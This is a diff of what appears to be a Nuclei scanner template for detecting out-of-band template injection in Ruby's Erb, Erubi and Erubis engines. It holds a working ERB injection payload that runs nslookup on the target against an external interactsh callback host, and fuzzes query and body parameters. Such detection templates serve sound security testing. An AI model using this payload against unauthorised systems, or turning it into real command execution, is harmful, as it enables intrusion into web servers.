@@ -1,5 +1,4 @@
 id: erb-erubi-erubis-oob
-
 info:
   name: Erb OR Erubi OR Erubis - Out of Band Template Injection
   author: 0xAwali,DhiyaneshDK
@@ -10,30 +9,31 @@ info:
     - https://medium.com/@0xAwali/template-engines-injection-101-4f2fe59e5756
   metadata:
     verified: true
-  tags: ssti,dast,oast,oob,vuln
-
+  tags: dast,oast,oob,ssti,vuln
 http:
-  - pre-condition:
-      - type: dsl
-        dsl:
-          - 'method == "GET"'
+  - fuzzing:
+      - fuzz:
+          - '{{injection}}'
+        mode: single
+        parts:
+          - query
+          - body
+        type: postfix
+    matchers:
+      - condition: and
+        # digest: 4a0a0047304502202ce9b6d241b8a7a7b5597d75981dc406bf9eab452c6c3cd1604b7b22eed531a0022100a2a670b68822b46fe873f44696ef5d7ed0434a548a2663d6222085a43324ec58:922c64590222798bb761d5b6d8e72950
 
+        dsl:
+          - contains(interactsh_protocol,'dns')
+          - contains(interactsh_request,'srv')
+        name: request-matcher
+        type: dsl
     payloads:
       injection:
-        - '<%25%3d(`nslookup+-type=SRV+{{interactsh-url}}`)%25>'
-
-    fuzzing:
-      - part: query
-        type: postfix
-        mode: single
-        fuzz:
-          - "{{injection}}"
-
-    matchers:
-      - type: dsl
-        name: request-matcher
-        dsl:
-          - "contains(interactsh_protocol,'dns')"
-          - "contains(interactsh_request,'srv')"
-        condition: and
-# digest: 4a0a004730450220339e6129262efd8b705181d9c5b9da8b6ac52e70c0b3815bf3f1672bfcff4d07022100be49c15c59d1241bdb873f973f0cebea10b3f7049327cdb3c051c99f2b8034ad:922c64590222798bb761d5b6d8e72950
+        - <%25%3d(`nslookup+-type=SRV+{{interactsh-url}}`)%25>
+    pre-condition:
+      - dsl:
+          - method == "GET"
+          - method == "POST"
+          - method == "PUT"
+        type: dsl
